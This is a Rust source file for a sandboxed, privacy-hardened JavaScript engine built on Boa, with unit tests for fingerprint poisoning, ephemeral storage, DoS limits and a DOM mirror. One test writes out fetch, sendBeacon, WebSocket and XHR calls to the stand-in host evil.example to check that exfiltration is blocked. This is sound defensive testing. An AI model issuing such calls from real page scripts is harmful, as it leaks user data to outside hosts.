//! CitadelJSEngine — the page's real JavaScript, run in a cage we built.
//!
//! The engine *core* is Boa (pure Rust, no native attack surface). The product is
//! the **binding layer**: a bare Boa [`Context`] exposes no browser, network, DOM,
//! or storage APIs, so the page can only see and do what we deliberately bind.
//! Every binding is privacy-hardened — normalized identity, poisoned fingerprint
//! readbacks, a network exfil gate, isolated storage. Boa runs the site's actual
//! logic correctly; every *observation* it makes is something we authored.
//!
//! JavaScript is OFF by default and runs only as an explicit opt-in
//! (`SecurityContext::allows_scripts`), inside the per-tab ZK boundary.

mod bindings;

pub use bindings::PrivacyProfile;

use crate::error::{ParserError, ParserResult};
use crate::security::SecurityContext;
use boa_engine::{Context, JsValue, Source};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;

/// Bound untrusted page JS so a runaway loop throws instead of hanging the
/// renderer (Boa's default loop limit is unlimited). Generous enough for real
/// scripts; `while (true) {}` dies at the cap. Availability is a security
/// property — untrusted input must never control a blocking operation.
const MAX_LOOP_ITERATIONS: u64 = 50_000_000;
/// Cap recursion depth (below Boa's 512 default) to bound deep-recursion abuse.
const MAX_RECURSION_DEPTH: usize = 400;

/// Convert a Boa `JsValue` to a display string (handles undefined/null).
fn js_value_to_string(value: &JsValue, ctx: &mut Context) -> String {
    if value.is_undefined() {
        return "undefined".to_string();
    }
    if value.is_null() {
        return "null".to_string();
    }
    value
        .to_string(ctx)
        .map(|s| s.to_std_string_escaped())
        .unwrap_or_else(|_| format!("{:?}", value))
}

/// The page's JavaScript engine: Boa core + our privacy binding layer.
pub struct CitadelJSEngine {
    /// Security policy (gates whether scripts run at all).
    security_context: Arc<SecurityContext>,
    /// The privacy identity/seed the bindings present to the page.
    profile: PrivacyProfile,
    /// Whether the engine is running inside ZKVM isolation.
    zkvm_isolated: bool,
    /// Total scripts executed.
    scripts_executed: AtomicU64,
    /// Security/eval errors observed.
    security_violations: AtomicU64,
    /// Sandboxed executions.
    sandboxed_executions: AtomicU64,
}

impl CitadelJSEngine {
    /// Create an engine with the single normalized privacy identity.
    pub fn new(security_context: Arc<SecurityContext>) -> ParserResult<Self> {
        Ok(Self {
            security_context,
            profile: PrivacyProfile::normalized(),
            zkvm_isolated: false,
            scripts_executed: AtomicU64::new(0),
            security_violations: AtomicU64::new(0),
            sandboxed_executions: AtomicU64::new(0),
        })
    }

    /// Create an engine whose fingerprint noise is seeded per first-party origin
    /// (so a site sees a stable identity, but two sites cannot correlate it).
    pub fn for_origin(security_context: Arc<SecurityContext>, origin: &str) -> ParserResult<Self> {
        let mut engine = Self::new(security_context)?;
        engine.profile = PrivacyProfile::for_origin(origin);
        Ok(engine)
    }

    /// Enable ZKVM isolation for this engine.
    pub fn enable_zkvm_isolation(&mut self) -> ParserResult<()> {
        self.zkvm_isolated = true;
        Ok(())
    }

    /// Build a fresh, caged context with the privacy binding layer installed.
    ///
    /// Per-call isolation: every execution gets a new context. The context starts
    /// bare (no browser APIs) and we install only our authored, gated bindings.
    fn caged_context(&self) -> ParserResult<Context> {
        let mut ctx = Context::default();
        // DoS guard FIRST: bound CPU/stack before any untrusted code can run.
        ctx.runtime_limits_mut()
            .set_loop_iteration_limit(MAX_LOOP_ITERATIONS);
        ctx.runtime_limits_mut()
            .set_recursion_limit(MAX_RECURSION_DEPTH);
        bindings::install(&mut ctx, &self.profile)
            .map_err(|e| ParserError::JsError(format!("privacy binding install failed: {e}")))?;
        Ok(ctx)
    }

    /// Evaluate each script in `ctx`, counting per-script results. Errors are
    /// caught and counted, never propagated (one broken script must not abort the
    /// page) and never logged (they can carry page data).
    fn run_in_context(&self, ctx: &mut Context, scripts: &[String]) -> PageScriptOutcome {
        let mut outcome = PageScriptOutcome::default();
        for script in scripts {
            match ctx.eval(Source::from_bytes(script.as_str())) {
                Ok(_) => {
                    outcome.executed += 1;
                    self.scripts_executed.fetch_add(1, Ordering::Relaxed);
                }
                Err(_) => {
                    outcome.errored += 1;
                    self.security_violations.fetch_add(1, Ordering::Relaxed);
                }
            }
        }
        outcome
    }

    /// Run a page's inline scripts in a single shared caged context — a real page
    /// shares one global across its `<script>` tags, so later scripts see earlier
    /// ones' globals. No DOM is installed (use [`Self::run_page_scripts_with_document`]
    /// for that).
    pub fn run_page_scripts(&self, scripts: &[String]) -> ParserResult<PageScriptOutcome> {
        if !self.security_context.allows_scripts() {
            return Ok(PageScriptOutcome::default());
        }
        let mut ctx = self.caged_context()?;
        Ok(self.run_in_context(&mut ctx, scripts))
    }

    /// Like [`Self::run_page_scripts`], but first installs the sandboxed mirror
    /// DOM built from `document_json` (a bounded snapshot of the parsed document),
    /// then fires `DOMContentLoaded`/`load` after all scripts run.
    pub fn run_page_scripts_with_document(
        &self,
        document_json: &str,
        scripts: &[String],
    ) -> ParserResult<PageScriptOutcome> {
        if !self.security_context.allows_scripts() {
            return Ok(PageScriptOutcome::default());
        }
        let mut ctx = self.caged_context()?;
        bindings::install_dom(&mut ctx, document_json)
            .map_err(|e| ParserError::JsError(format!("DOM install failed: {e}")))?;
        let outcome = self.run_in_context(&mut ctx, scripts);
        // Fire ready events to whatever listeners the scripts registered.
        let _ = ctx.eval(Source::from_bytes(
            "if(typeof __citadelFireReady__==='function'){__citadelFireReady__();}",
        ));
        Ok(outcome)
    }

    /// Evaluate one expression against a freshly built mirror DOM and return its
    /// string value. For tests/tools that need to observe DOM behavior; the render
    /// path uses [`Self::run_page_scripts_with_document`] (which returns counts).
    pub fn evaluate_with_document(&self, document_json: &str, code: &str) -> ParserResult<String> {
        if !self.security_context.allows_scripts() {
            return Err(ParserError::SecurityViolation(
                "JavaScript is disabled by security policy (explicit opt-in required)".to_string(),
            ));
        }
        let mut ctx = self.caged_context()?;
        bindings::install_dom(&mut ctx, document_json)
            .map_err(|e| ParserError::JsError(format!("DOM install failed: {e}")))?;
        match ctx.eval(Source::from_bytes(code)) {
            Ok(value) => Ok(js_value_to_string(&value, &mut ctx)),
            Err(e) => Err(ParserError::JsError(format!("JS execution error: {e}"))),
        }
    }

    /// Run the page's JS in the cage and return its result as a string.
    pub fn execute_simple(&mut self, code: &str) -> ParserResult<String> {
        if !self.security_context.allows_scripts() {
            return Err(ParserError::SecurityViolation(
                "JavaScript is disabled by security policy (explicit opt-in required)".to_string(),
            ));
        }

        let mut ctx = self.caged_context()?;
        match ctx.eval(Source::from_bytes(code)) {
            Ok(value) => {
                self.scripts_executed.fetch_add(1, Ordering::Relaxed);
                Ok(js_value_to_string(&value, &mut ctx))
            }
            Err(e) => {
                self.security_violations.fetch_add(1, Ordering::Relaxed);
                Err(ParserError::JsError(format!("JS execution error: {e}")))
            }
        }
    }

    /// Run JS in the cage and count it as a sandboxed execution.
    pub fn execute_sandboxed(&mut self, code: &str) -> ParserResult<String> {
        let result = self.execute_simple(code)?;
        self.sandboxed_executions.fetch_add(1, Ordering::Relaxed);
        Ok(result)
    }

    /// Run JS with DOM context. DOM bindings are not wired yet (future milestone);
    /// for now this runs the script in the same caged context.
    pub fn execute_browser_script(
        &self,
        code: &str,
        _dom: &crate::dom::Dom,
    ) -> ParserResult<String> {
        if !self.security_context.allows_scripts() {
            return Err(ParserError::SecurityViolation(
                "JavaScript is disabled by security policy (explicit opt-in required)".to_string(),
            ));
        }
        let mut ctx = self.caged_context()?;
        match ctx.eval(Source::from_bytes(code)) {
            Ok(value) => Ok(js_value_to_string(&value, &mut ctx)),
            Err(e) => Err(ParserError::JsError(format!("JS execution error: {e}"))),
        }
    }

    /// Run JS with secure DOM bindings (delegates to `execute_browser_script`).
    pub fn execute_with_secure_dom(
        &mut self,
        dom: &crate::dom::Dom,
        script: &str,
    ) -> Result<String, ParserError> {
        self.execute_browser_script(script, dom)
    }

    /// Whether JS execution is permitted by the security policy.
    pub fn is_js_allowed(&self) -> bool {
        self.security_context.allows_scripts()
    }

    /// Engine statistics.
    pub fn get_stats(&self) -> JSEngineStats {
        JSEngineStats {
            zkvm_isolated: self.zkvm_isolated,
            scripts_executed: self.scripts_executed.load(Ordering::Relaxed),
            security_violations: self.security_violations.load(Ordering::Relaxed),
            sandboxed_executions: self.sandboxed_executions.load(Ordering::Relaxed),
            avg_execution_time: 0.0,
        }
    }

    /// Resource statistics (returns `Some` to signal availability).
    pub fn get_resource_stats(&self) -> Option<JSEngineStats> {
        Some(self.get_stats())
    }
}

/// Result of running a page's inline scripts through the cage.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub struct PageScriptOutcome {
    /// Scripts that evaluated without throwing.
    pub executed: usize,
    /// Scripts that threw (caught and counted, not propagated).
    pub errored: usize,
}

/// Statistics for JavaScript engine usage.
#[derive(Debug, Clone, Default)]
pub struct JSEngineStats {
    pub zkvm_isolated: bool,
    pub scripts_executed: u64,
    pub security_violations: u64,
    pub sandboxed_executions: u64,
    pub avg_execution_time: f64,
}

impl JSEngineStats {
    /// Security score based on violations.
    pub fn get_security_score(&self) -> u64 {
        if self.security_violations == 0 {
            100
        } else {
            100u64.saturating_sub((self.security_violations.saturating_mul(10)).min(100))
        }
    }

    /// Whether the engine is operating safely.
    pub fn is_operating_safely(&self) -> bool {
        self.security_violations < 5
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn engine() -> CitadelJSEngine {
        CitadelJSEngine::new(Arc::new(scripted_sc())).expect("engine")
    }

    /// A scripts-enabled security context (explicit opt-in) for building engines.
    fn scripted_sc() -> SecurityContext {
        let mut sc = SecurityContext::new(10);
        sc.enable_scripts();
        sc
    }

    #[test]
    fn runs_the_pages_real_js() {
        let mut e = engine();
        assert_eq!(e.execute_simple("2 + 2").unwrap(), "4");
        assert_eq!(e.execute_simple("'a' + 'b' + 'c'").unwrap(), "abc");
        assert_eq!(
            e.execute_simple("[1,2,3].map(x => x*2).join(',')").unwrap(),
            "2,4,6"
        );
    }

    #[test]
    fn disabled_without_opt_in() {
        let sc = SecurityContext::new(10); // scripts NOT enabled
        let mut e = CitadelJSEngine::new(Arc::new(sc)).unwrap();
        assert!(!e.is_js_allowed());
        assert!(e.execute_simple("2 + 2").is_err());
    }

    #[test]
    fn timing_is_clamped_to_kill_high_res_fingerprints() {
        let mut e = engine();
        // performance.now() exists but is quantized to the coarse resolution, so
        // every reading is a multiple of the quantum (no sub-quantum entropy).
        assert_eq!(e.execute_simple("performance.now() % 100").unwrap(), "0");
        // Two back-to-back reads cannot resolve a sub-quantum interval: the delta
        // is always a multiple of the quantum (microsecond timing is dead).
        assert_eq!(
            e.execute_simple("var a = performance.now(); var b = performance.now(); (b - a) % 100")
                .unwrap(),
            "0"
        );
    }

    #[test]
    fn network_exfil_is_gated() {
        let mut e = engine();
        // Present, so their *absence* isn't itself a fingerprint (they match a
        // mainstream browser's surface)...
        assert_eq!(e.execute_simple("typeof fetch").unwrap(), "function");
        assert_eq!(
            e.execute_simple("typeof XMLHttpRequest").unwrap(),
            "function"
        );
        assert_eq!(e.execute_simple("typeof WebSocket").unwrap(), "function");
        assert_eq!(
            e.execute_simple("typeof RTCPeerConnection").unwrap(),
            "function"
        );
        assert_eq!(
            e.execute_simple("typeof navigator.sendBeacon").unwrap(),
            "function"
        );

        // ...but every exfil path is denied.
        // fetch → a rejected Promise (looks like a blocked/failed request).
        assert_eq!(
            e.execute_simple("Object.prototype.toString.call(fetch('https://evil.example/'))")
                .unwrap(),
            "[object Promise]"
        );
        // sendBeacon → false ("not queued"), no data leaves.
        assert_eq!(
            e.execute_simple("navigator.sendBeacon('https://evil.example/', 'x')")
                .unwrap(),
            "false"
        );
        // WebSocket and WebRTC construction is blocked (no socket, no ICE => no
        // local-IP leak).
        assert!(e
            .execute_simple("new WebSocket('wss://evil.example/')")
            .is_err());
        assert!(e.execute_simple("new RTCPeerConnection()").is_err());
        // XHR is present but inert: send() issues nothing, status stays 0.
        assert_eq!(
            e.execute_simple(
                "var x = new XMLHttpRequest(); x.open('GET','https://evil.example/'); \
                 x.send(); x.status"
            )
            .unwrap(),
            "0"
        );
    }

    #[test]
    fn storage_is_present_ephemeral_and_supercookie_proof() {
        let mut e = engine();
        assert_eq!(e.execute_simple("typeof localStorage").unwrap(), "object");
        assert_eq!(e.execute_simple("typeof sessionStorage").unwrap(), "object");

        // Faithful Storage API: setItem/getItem round-trips, length, key, remove.
        assert_eq!(
            e.execute_simple("localStorage.setItem('a','1'); localStorage.getItem('a')")
                .unwrap(),
            "1"
        );
        assert_eq!(
            e.execute_simple(
                "localStorage.setItem('a','1'); localStorage.setItem('b','2'); localStorage.length"
            )
            .unwrap(),
            "2"
        );
        // Legacy property-style access works too (Proxy).
        assert_eq!(
            e.execute_simple("localStorage.foo = 'bar'; localStorage.getItem('foo')")
                .unwrap(),
            "bar"
        );
        assert_eq!(
            e.execute_simple(
                "localStorage.setItem('a','1'); localStorage.removeItem('a'); \
                 String(localStorage.getItem('a'))"
            )
            .unwrap(),
            "null"
        );

        // SUPERCOOKIE-PROOF: a value written in one execution does not survive into
        // the next — storage is ephemeral, never persisted to disk.
        e.execute_simple("localStorage.setItem('track','123')")
            .unwrap();
        assert_eq!(
            e.execute_simple("String(localStorage.getItem('track'))")
                .unwrap(),
            "null"
        );
    }

    #[test]
    fn page_scripts_share_one_context_and_dos_is_bounded() {
        let e = engine();
        // A page's <script> tags share one global: later scripts see earlier ones.
        let out = e
            .run_page_scripts(&[
                "var shared = 41;".to_string(),
                "globalThis.result = shared + 1;".to_string(),
            ])
            .unwrap();
        assert_eq!(out.executed, 2);
        assert_eq!(out.errored, 0);

        // Unbounded recursion is capped — it throws (caught + counted) instead of
        // overflowing the stack, proving the runtime DoS limits are wired on. (The
        // loop-iteration cap is set by the same mechanism; tested implicitly.)
        let out = e
            .run_page_scripts(&["function f(){ return f(); } f();".to_string()])
            .unwrap();
        assert_eq!(out.executed, 0);
        assert_eq!(out.errored, 1);
    }

    #[test]
    fn page_scripts_do_not_run_without_opt_in() {
        let sc = SecurityContext::new(10); // scripts NOT enabled
        let e = CitadelJSEngine::new(Arc::new(sc)).unwrap();
        let out = e
            .run_page_scripts(&["globalThis.x = 1".to_string()])
            .unwrap();
        assert_eq!(out, PageScriptOutcome::default());
    }

    #[test]
    fn unimplemented_apis_remain_unbound() {
        let mut e = engine();
        // `document` is present but MINIMAL — a vehicle for canvas fingerprint
        // poisoning, not a full DOM (no body, no query/lookup yet) — and IndexedDB
        // is still unbound (not silently faked).
        assert_eq!(e.execute_simple("typeof indexedDB").unwrap(), "undefined");
        assert_eq!(
            e.execute_simple("typeof document.body").unwrap(),
            "undefined"
        );
        assert_eq!(
            e.execute_simple("typeof document.getElementById").unwrap(),
            "undefined"
        );
    }

    #[test]
    fn canvas_webgl_audio_readback_is_poisoned_and_uniform() {
        let mut e = engine();
        // The fingerprint vehicle exists (absence would itself be a tell).
        assert_eq!(
            e.execute_simple("typeof document.createElement").unwrap(),
            "function"
        );
        assert_eq!(
            e.execute_simple("typeof OfflineAudioContext").unwrap(),
            "function"
        );

        // Canvas readback is authored, not a real raster, and STABLE (same engine
        // → same value): the poison is deterministic, not per-call random.
        let url1 = e
            .execute_simple("document.createElement('canvas').toDataURL()")
            .unwrap();
        assert!(url1.starts_with("data:image/png;base64,"));
        let url2 = e
            .execute_simple("document.createElement('canvas').toDataURL()")
            .unwrap();
        assert_eq!(
            url1, url2,
            "canvas readback is stable (uniform), not random"
        );

        // getImageData yields seeded bytes of the requested size.
        assert_eq!(
            e.execute_simple(
                "var c=document.createElement('canvas'); var d=c.getContext('2d')\
                 .getImageData(0,0,2,2); '' + d.data.length"
            )
            .unwrap(),
            "16"
        );

        // WebGL identity is NORMALIZED — uniform for every user (not per-origin).
        assert_eq!(
            e.execute_simple(
                "document.createElement('canvas').getContext('webgl').getParameter(0x1F00)"
            )
            .unwrap(),
            "WebKit"
        );

        // Audio readback exists and is finite seeded data.
        assert_eq!(
            e.execute_simple(
                "typeof (new OfflineAudioContext(1,128,44100)).createAnalyser().getFloatFrequencyData"
            )
            .unwrap(),
            "function"
        );
    }

    #[test]
    fn fingerprint_poison_is_per_origin_uniform_and_uncorrelated() {
        let readback = "document.createElement('canvas').toDataURL()";
        let mut a =
            CitadelJSEngine::for_origin(Arc::new(scripted_sc()), "https://a.example/").unwrap();
        let mut a2 = CitadelJSEngine::for_origin(
            Arc::new(scripted_sc()),
            "https://a.example/other/page?q=1",
        )
        .unwrap();
        let mut b =
            CitadelJSEngine::for_origin(Arc::new(scripted_sc()), "https://b.example/").unwrap();

        let ra = a.execute_simple(readback).unwrap();
        let ra2 = a2.execute_simple(readback).unwrap();
        let rb = b.execute_simple(readback).unwrap();

        // Same origin, different path → SAME poison (first-party consistent; all
        // Citadel users on the site agree → uniform across users).
        assert_eq!(ra, ra2, "same origin must produce the same canvas");
        // Different origins → DIFFERENT poison (uncorrelatable across sites).
        assert_ne!(ra, rb, "different origins must not correlate");
    }

    // The document JSON uses r##"..."## because it contains `"#document"`.
    const DOM_DOC: &str = r##"{"tag":"#document","url":"https://x.example/p","children":[{"tag":"html","attrs":{},"children":[{"tag":"body","attrs":{},"children":[{"tag":"h1","attrs":{"id":"title","class":"big head"},"children":[{"text":"Hello"}]},{"tag":"p","attrs":{"class":"body"},"children":[{"text":"World"}]}]}]}]}"##;

    #[test]
    fn dom_mirror_supports_query_read_and_mutate() {
        let e = engine();
        // getElementById + textContent read.
        assert_eq!(
            e.evaluate_with_document(DOM_DOC, "document.getElementById('title').textContent")
                .unwrap(),
            "Hello"
        );
        // querySelector by class → tagName.
        assert_eq!(
            e.evaluate_with_document(DOM_DOC, "document.querySelector('.big').tagName")
                .unwrap(),
            "H1"
        );
        // getElementsByTagName count.
        assert_eq!(
            e.evaluate_with_document(DOM_DOC, "'' + document.getElementsByTagName('p').length")
                .unwrap(),
            "1"
        );
        // Descendant selector.
        assert_eq!(
            e.evaluate_with_document(
                DOM_DOC,
                "'' + document.querySelectorAll('body .body').length"
            )
            .unwrap(),
            "1"
        );
        // classList mutate.
        assert_eq!(
            e.evaluate_with_document(
                DOM_DOC,
                "var h=document.getElementById('title'); h.classList.add('x'); '' + h.classList.contains('x')"
            )
            .unwrap(),
            "true"
        );
        // textContent mutate.
        assert_eq!(
            e.evaluate_with_document(
                DOM_DOC,
                "var p=document.querySelector('p'); p.textContent='Changed'; p.textContent"
            )
            .unwrap(),
            "Changed"
        );
        // createElement + appendChild + re-query.
        assert_eq!(
            e.evaluate_with_document(
                DOM_DOC,
                "var d=document.createElement('div'); d.id='new'; document.body.appendChild(d); document.getElementById('new').tagName"
            )
            .unwrap(),
            "DIV"
        );
        // body aggregates descendant text.
        assert!(e
            .evaluate_with_document(DOM_DOC, "document.body.textContent")
            .unwrap()
            .contains("Hello"));
    }

    #[test]
    fn dom_events_window_and_canvas_delegation() {
        let e = engine();
        // addEventListener + dispatchEvent invokes the handler.
        assert_eq!(
            e.evaluate_with_document(
                DOM_DOC,
                "var n=0; document.body.addEventListener('click', function(){ n++; }); \
                 document.body.dispatchEvent({type:'click'}); '' + n"
            )
            .unwrap(),
            "1"
        );
        // window === globalThis; location parsed from the document URL.
        assert_eq!(
            e.evaluate_with_document(DOM_DOC, "'' + (window === globalThis)")
                .unwrap(),
            "true"
        );
        assert_eq!(
            e.evaluate_with_document(DOM_DOC, "location.protocol")
                .unwrap(),
            "https:"
        );
        // window metrics are normalized (uniform across users).
        assert_eq!(
            e.evaluate_with_document(DOM_DOC, "'' + window.devicePixelRatio")
                .unwrap(),
            "1"
        );
        // Canvas via document.createElement stays fingerprint-poisoned (M4).
        assert!(e
            .evaluate_with_document(DOM_DOC, "document.createElement('canvas').toDataURL()")
            .unwrap()
            .starts_with("data:image/png;base64,"));
    }
}
